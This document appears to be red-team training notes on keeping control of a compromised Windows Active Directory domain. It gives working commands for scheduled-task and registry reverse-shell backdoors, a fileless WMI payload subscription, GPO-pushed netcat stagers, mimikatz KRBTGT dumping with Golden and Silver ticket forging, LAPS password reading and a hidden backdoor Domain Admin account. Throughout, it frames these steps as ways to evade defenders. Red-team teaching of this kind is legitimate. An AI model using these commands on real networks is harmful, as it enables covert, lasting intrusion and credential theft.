Once you‚Äôve compromised key systems or become Domain Admin (DA), your job shifts from attacking to maintaining control, stealth, and extracting value. This phase is crucial for red teamers, APT simulation, and real-world post-exploitation.


Post-Exploitation Mindset
üîê You‚Äôve got the crown ‚Äî now don‚Äôt lose it.
The network is yours. The blue team may reboot, patch, scan, or audit. 
Your goal is to:
	‚Ä¢ Stay persistent
	‚Ä¢ Survive reboot
	‚Ä¢ Blend in
	‚Ä¢ Maintain access across workstations, servers, and AD itself


Persistence Techniques
Technique	Description	When Used
Scheduled Tasks	Persist code execution on reboot or interval	Lightweight, stable
GPO Backdoors	Modify existing GPO or create new one to push malware	Domain-wide control
WMI Event Subscription	Fire payloads based on system events	Very stealthy
Registry Run Keys	Auto-start backdoors via registry	Easy to deploy
Service Hijack / Creation	Start malicious services on boot	Useful on servers
Startup Folder	Drop payload in user‚Äôs startup folder	Works well for RDP persistence
Golden/Silver Tickets	Create persistent Kerberos tickets	Survive reboots, mimic legit access


Scheduled Task 

powershell
schtasks /create /tn "Updater" /tr "cmd.exe /c C:\Tools\rev.bat" /sc minute /mo 15 /ru SYSTEM
	‚Ä¢ /tn = Task name
	‚Ä¢ /tr = Your reverse shell
	‚Ä¢ /sc = Trigger schedule
	‚Ä¢ /ru SYSTEM = Run as SYSTEM (or use another domain user)
üß† This runs every 15 mins. You own the box repeatedly.


GPO-Based Persistence
	1. You‚Äôre DA or own a GPO via SharpGPOAbuse
	2. Inject a scheduled task via GPO:
		‚óã Open Group Policy Management
		‚óã Navigate: User Configuration ‚ûù Preferences ‚ûù Control Panel ‚ûù Scheduled Tasks
		‚óã Create a task to run nc.exe or PowerShell stager
	3. Link the GPO to an OU containing target machines
üß† Mass deployment with one click. Survives reboots. Hard to detect.


WMI Event Subscription (Fileless, AV-Evasive)

powershell
# PowerShell example (basic)
$Filter=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name='BackdoorFilter'; EventNamespace='root\cimv2';
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 5"
}
$Consumer=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name='BackdoorConsumer'; CommandLineTemplate='powershell -nop -w hidden -e <payload>'
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter=$Filter; Consumer=$Consumer
}
üß† Triggers payload every 10 seconds past the 5th second. Fileless. Often missed by EDR.


Registry Key ‚Äì Run On Boot

powershell
CopyEdit
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Tools\revshell.bat"
	‚Ä¢ Adds persistence under current user
	‚Ä¢ Use HKLM for SYSTEM-wide access
üß† Combine with folder that looks like legit software (C:\ProgramData\Updater\).


Silver / Golden Ticket Attacks (Kerberos)
Once you have KRBTGT hash, you can forge tickets that last for days, weeks, years.

Golden Ticket ‚Äì Complete Domain Persistence
	1. Extract the KRBTGT hash via:

mimikatz
lsadump::lsa /patch
	2. Forge a ticket:

mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:<NTLM hash> /id:500 /ptt
	3. Use whoami to confirm:

corp\Administrator
‚úÖ You are DA, even if the account was deleted. This is stealthy, hard to detect, lasts forever.
This command creates and injects a forged Kerberos Ticket Granting Ticket (TGT) for the Administrator user in the corp.local domain ‚Äî a Golden Ticket attack.

What Each Parameter Means:
Parameter	Description
/user:Administrator	The user account you're impersonating in the forged TGT. Here, it‚Äôs the built-in domain Administrator.
/domain:corp.local	The domain the user belongs to. Must match the target AD domain.
/sid:S-1-5-21-xxx	The domain's Security Identifier. Every domain has a unique SID.
/krbtgt:<NTLM hash>	The NTLM hash of the KRBTGT account ‚Äì the most critical part. It's used to sign valid TGTs. If you have this, you can forge tickets.
/id:500	The RID (Relative ID) of the user. 500 = built-in domain Administrator account.
/ptt	"Pass The Ticket" ‚Äî the forged ticket is immediately injected into the current session. You don‚Äôt just create it ‚Äî you start using it right away.

What It Does in Practice:
	1. Generates a TGT for the Administrator account ‚Äî signed with the krbtgt NTLM hash.
	2. Injects the TGT into memory (/ptt), so the attacker is now authenticated as a domain admin.
	3. The attacker can now:
		‚óã Access resources that require Kerberos auth (e.g., SMB shares, DCs, SQL, etc.)
		‚óã Use tools like dir \\dc\c$, wmiexec, or RDP as Administrator
		‚óã Perform DCSync, dump all hashes, create persistence, etc.

Why It‚Äôs So Powerful
	‚Ä¢ A Golden Ticket doesn‚Äôt expire unless the domain‚Äôs krbtgt password is rotated.
	‚Ä¢ Even if the real Administrator is renamed, deleted, or has a different password ‚Äî this still works.
	‚Ä¢ It grants access anywhere in the domain, often undetected unless ticket anomalies are monitored.




Silver Ticket ‚Äì Service Specific
Forge a TGS for a specific service like CIFS or MSSQL:

mimikatz
kerberos::golden /user:svcSQL /domain:corp.local /sid:S-1-5-21... /target:sql.corp.local /service:MSSQLSvc /rc4:<NTLM of svcSQL> /ptt
üß† Silver ticket = stealthy lateral access (e.g. to a file server)

This command creates and injects a forged Kerberos Ticket Granting Service (TGS) for the svcSQL account, allowing access to the MSSQLSvc service on the host sql.corp.local ‚Äî without contacting the domain controller.
This is a Silver Ticket attack: it targets individual services, not the entire domain.

Detailed Parameter Breakdown:
Parameter	What It Means
/user:svcSQL	The service account you're impersonating. This must be the account that normally requests TGS tickets for that service (in this case, svcSQL).
/domain:corp.local	The target AD domain.
/sid:S-1-5-21...	The domain SID (same as with Golden Tickets).
/target:sql.corp.local	The hostname of the service machine you're targeting. Must match SPN registration.
/service:MSSQLSvc	The Kerberos SPN (Service Principal Name) of the target service. Examples include: CIFS, HTTP, HOST, MSSQLSvc, etc.
/rc4:<NTLM>	The NTLM hash of the service account (not krbtgt!). Used to sign the TGS.
/ptt	"Pass The Ticket" ‚Äì inject the forged TGS into memory immediately.


What Happens
	‚Ä¢ Mimikatz crafts a TGS (ticket-granting service ticket) as if it came from svcSQL, destined for the MSSQL service on sql.corp.local.
	‚Ä¢ This TGS is signed with the service account's NTLM hash, which is valid for that specific service.
	‚Ä¢ No communication with the domain controller is needed ‚Äî this is completely offline.
	‚Ä¢ Once injected (/ptt), the attacker can access that specific service as that user.


Why Silver Tickets Are Stealthy
	‚Ä¢ Never touch the DC ‚Äî unlike a Golden Ticket, the forged TGS is never validated against the domain.
	‚Ä¢ If ticket expiration is set to 10 hours, you have 10 hours of stealth access to that one service.
	‚Ä¢ Detection is harder ‚Äî only possible with proper ticket validation auditing and strict SPN configs.

Summary: Golden vs Silver Ticket
Feature	Golden Ticket	Silver Ticket
Forged Ticket	TGT (Ticket Granting Ticket)	TGS (Ticket Granting Service Ticket)
Scope	Entire domain	Single service / server
Signing Secret	krbtgt NTLM hash	Service account‚Äôs NTLM hash
Stealth Level	Medium ‚Äì touches DC	High ‚Äì doesn‚Äôt touch DC
Used For	Domain persistence	Quiet lateral movement / targeted access



LAPS Abuse ‚Äì Local Admin Password Stealing
If LAPS (Local Admin Password Solution) is deployed but misconfigured:
	1. Dump LAPS password from AD:

powershell
Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd | ft Name,ms-Mcs-AdmPwd
	2. Use password to:
		‚óã Get local admin access
		‚óã Move laterally
		‚óã Create persistent services
		
üß† Use BloodHound to see if you can read LAPS secrets.


Realistic Persistence Strategy
Tier	Persistence Option	Description
Basic	Startup script, registry run key	Easy to deploy, easy to clean
Intermediate	Scheduled task, GPO, LAPS abuse	Reliable and widespread
Advanced	WMI events, Silver/Golden tickets	Stealthy, long-term, hard to detect


Tools for Post-Exploitation
Tool	Use
Mimikatz	Dump credentials, craft tickets
Rubeus	Kerberos ticket requests/injection
PowerSploit	Persistence modules (Invoke-Persistence)
SharpPersist	Sharp tool for persistence methods
Evil-WinRM	Access boxes with winrm + creds or tickets
BloodHound	Reassess for additional privesc after persistence


Post-Exploitation Scenario
	1. You gain DA via SharpGPOAbuse
	2. You use mimikatz to dump KRBTGT hash
	3. Forge a Golden Ticket
	4. Deploy a GPO-based scheduled task to:
		‚óã Drop a reverse shell
		‚óã Create a user: net user backdoor P@ssw0rd! /add
	5. Add backdoor user to Domain Admins
	6. Use BloodHound again with new credentials

